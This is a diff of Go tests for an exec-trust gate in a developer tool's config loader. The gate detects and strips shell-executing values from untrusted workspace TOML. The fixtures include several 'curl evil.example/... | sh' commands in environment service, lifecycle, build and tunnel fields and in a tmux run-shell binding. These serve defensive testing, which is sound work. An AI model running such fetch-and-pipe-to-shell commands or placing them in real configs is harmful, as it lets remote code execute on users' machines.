@@ -643,3 +643,206 @@ func TestWorkspaceCannotDisableTheGate(t *testing.T) {
 		t.Fatal("the gate must still have run and reported")
 	}
 }
+
+// execGlobalOnlyFixture builds a HOME whose only grove config is the user's
+// own — a global grove.toml plus a global grove.override.toml — and returns a
+// working directory that contains no project config anywhere above it. This is
+// the shape that makes FindConfigFile fall through to the XDG global config.
+func execGlobalOnlyFixture(t *testing.T) (workDir, globalPath, overridePath string) {
+	t.Helper()
+	ResetLoadCache()
+	t.Cleanup(ResetLoadCache)
+
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+	t.Setenv("XDG_CONFIG_HOME", filepath.Join(home, ".config"))
+	t.Setenv("XDG_STATE_HOME", filepath.Join(home, ".state"))
+	t.Setenv("GROVE_HOME", "")
+	t.Setenv("GROVE_CONFIG_OVERLAY", "")
+	t.Setenv(exectrust.EnvStorePath, filepath.Join(home, "exec-trust.json"))
+	t.Setenv(EnvExecTrust, "")
+
+	globalDir := filepath.Join(home, ".config", "grove")
+	if err := os.MkdirAll(globalDir, 0o755); err != nil {
+		t.Fatalf("mkdir global config: %v", err)
+	}
+	globalPath = filepath.Join(globalDir, "grove.toml")
+	if err := os.WriteFile(globalPath, []byte(`
+version = "1.0"
+
+[[hooks.on_stop]]
+name = "my-own-hook"
+command = "echo user-owned"
+`), 0o644); err != nil {
+		t.Fatalf("write global config: %v", err)
+	}
+	overridePath = filepath.Join(globalDir, "grove.override.toml")
+	if err := os.WriteFile(overridePath, []byte(`
+[[hooks.on_stop]]
+name = "my-own-override-hook"
+command = "echo user-owned-override"
+`), 0o644); err != nil {
+		t.Fatalf("write global override: %v", err)
+	}
+
+	workDir = filepath.Join(home, "scratch")
+	if err := os.MkdirAll(workDir, 0o755); err != nil {
+		t.Fatalf("mkdir work dir: %v", err)
+	}
+	return workDir, globalPath, overridePath
+}
+
+// TestLoadFromNeverGatesTheGlobalFallbackLayers is the regression for the
+// global-fallback provenance mislabel: with no project config anywhere,
+// FindConfigFile returns the XDG global config, so the "project" and "override"
+// layers ARE the user's own files. Gating them quarantined the user's own
+// hooks and accused their own config of being an untrusted workspace.
+func TestLoadFromNeverGatesTheGlobalFallbackLayers(t *testing.T) {
+	workDir, _, _ := execGlobalOnlyFixture(t)
+
+	cfg, err := LoadFrom(workDir)
+	if err != nil {
+		t.Fatalf("LoadFrom: %v", err)
+	}
+	if cfg.ExecGate != nil {
+		t.Errorf("the user's own global config must not be gated, got report %+v", cfg.ExecGate)
+	}
+	var hooksCfg HooksConfig
+	if err := cfg.UnmarshalExtension("hooks", &hooksCfg); err != nil {
+		t.Fatalf("unmarshal hooks extension: %v", err)
+	}
+	// The global override wins over the global config for the same key; if the
+	// gate had quarantined the override layer, the base hook would show here.
+	if len(hooksCfg.OnStop) != 1 || hooksCfg.OnStop[0].Name != "my-own-override-hook" {
+		t.Errorf("the user's own global override hooks.on_stop must survive, got %+v", hooksCfg.OnStop)
+	}
+}
+
+// TestLoadLayeredNeverGatesTheGlobalFallbackLayers is the LoadLayered half of
+// the same regression: `grove config` / `grove config trust` must not list the
+// user's own global config as an untrusted workspace file.
+func TestLoadLayeredNeverGatesTheGlobalFallbackLayers(t *testing.T) {
+	workDir, globalPath, overridePath := execGlobalOnlyFixture(t)
+
+	layered, err := LoadLayered(workDir)
+	if err != nil {
+		t.Fatalf("LoadLayered: %v", err)
+	}
+	if layered.Final == nil {
+		t.Fatal("expected a merged config")
+	}
+	if report := layered.Final.ExecGate; report != nil {
+		for _, f := range report.Files {
+			if f.Path == globalPath || f.Path == overridePath {
+				t.Errorf("the user's own config %s was gated as layer %q", f.Path, f.Layer)
+			}
+		}
+	}
+	if layered.Project != nil {
+		var hooksCfg HooksConfig
+		if err := layered.Project.UnmarshalExtension("hooks", &hooksCfg); err == nil && len(hooksCfg.OnStop) == 0 {
+			t.Error("the global-fallback project layer was stripped of the user's own hooks")
+		}
+	}
+}
+
+// TestExecGateCoversDaemonExecutedEnvironmentConfig pins the environment
+// sub-tables groved shells out to. [environment.config] is forwarded verbatim
+// to the daemon as EnvRequest.Config, which runs services[*].command,
+// lifecycle.pre_stop, images[*].build and tunnels[*].command.
+func TestExecGateCoversDaemonExecutedEnvironmentConfig(t *testing.T) {
+	isolateTrustStore(t)
+
+	const envTOML = `
+version = "1.0"
+
+[environment]
+provider = "native"
+
+[environment.config]
+path = "infra/dev"
+
+[environment.config.services.web]
+command = "curl evil.example/payload | sh"
+
+[environment.config.lifecycle]
+pre_stop = "curl evil.example/prestop | sh"
+
+[environment.config.images.app]
+build = "curl evil.example/build | sh"
+
+[environment.config.tunnels.db]
+command = "curl evil.example/tunnel | sh"
+
+[environments.staging.config.services.api]
+command = "curl evil.example/staging | sh"
+`
+	cfg, err := unmarshalConfig("grove.toml", []byte(envTOML))
+	if err != nil {
+		t.Fatalf("parse fixture: %v", err)
+	}
+
+	findings := ScanExecValues(cfg)
+	for _, key := range []string{
+		"environment.config.services.web",
+		"environment.config.lifecycle",
+		"environment.config.images.app",
+		"environment.config.tunnels.db",
+		"environments.staging.config.services.api",
+	} {
+		if !hasKey(findings, key) {
+			t.Errorf("expected an exec finding for %q; got %v", key, findingKeys(findings))
+		}
+	}
+
+	// These are user-invoked (`grove env up`), so the default policy reports
+	// rather than strips; strict must quarantine them.
+	store := exectrust.Load()
+	_, _ = applyExecGate(cfg, SourceProject, "/tmp/grove.toml", store, ExecTrustModeStrict)
+
+	if svc, ok := cfg.Environment.Config["services"].(map[string]interface{}); ok && len(svc) != 0 {
+		t.Errorf("environment.config.services survived the strict gate: %v", svc)
+	}
+	if lc := cfg.Environment.Config["lifecycle"]; lc != nil {
+		t.Errorf("environment.config.lifecycle survived the strict gate: %v", lc)
+	}
+	if imgs, ok := cfg.Environment.Config["images"].(map[string]interface{}); ok && len(imgs) != 0 {
+		t.Errorf("environment.config.images survived the strict gate: %v", imgs)
+	}
+	if tun, ok := cfg.Environment.Config["tunnels"].(map[string]interface{}); ok && len(tun) != 0 {
+		t.Errorf("environment.config.tunnels survived the strict gate: %v", tun)
+	}
+	// Inert provider config must keep flowing — the gate names sub-tables, not
+	// the whole [environment.config] blob.
+	if cfg.Environment.Config["path"] != "infra/dev" {
+		t.Errorf("the gate stripped inert provider config: %v", cfg.Environment.Config)
+	}
+}
+
+// TestExecGateCoversGenericTmuxBindings pins [keys.tmux.bindings], whose
+// values are written into the user's tmux config where `run-shell` reaches a
+// shell.
+func TestExecGateCoversGenericTmuxBindings(t *testing.T) {
+	isolateTrustStore(t)
+
+	cfg, err := unmarshalConfig("grove.toml", []byte(`
+version = "1.0"
+
+[keys.tmux.bindings]
+"M-z" = "run-shell 'curl evil.example | sh'"
+`))
+	if err != nil {
+		t.Fatalf("parse fixture: %v", err)
+	}
+	if !hasKey(ScanExecValues(cfg), "keys.tmux.bindings") {
+		t.Fatalf("expected an exec finding for keys.tmux.bindings; got %v", findingKeys(ScanExecValues(cfg)))
+	}
+
+	store := exectrust.Load()
+	_, _ = applyExecGate(cfg, SourceProject, "/tmp/grove.toml", store, ExecTrustModeDefault)
+
+	tmux, _ := cfg.Extensions["keys"].(map[string]interface{})["tmux"].(map[string]interface{})
+	if b, ok := tmux["bindings"]; ok {
+		t.Errorf("keys.tmux.bindings survived the default gate: %v", b)
+	}
+}
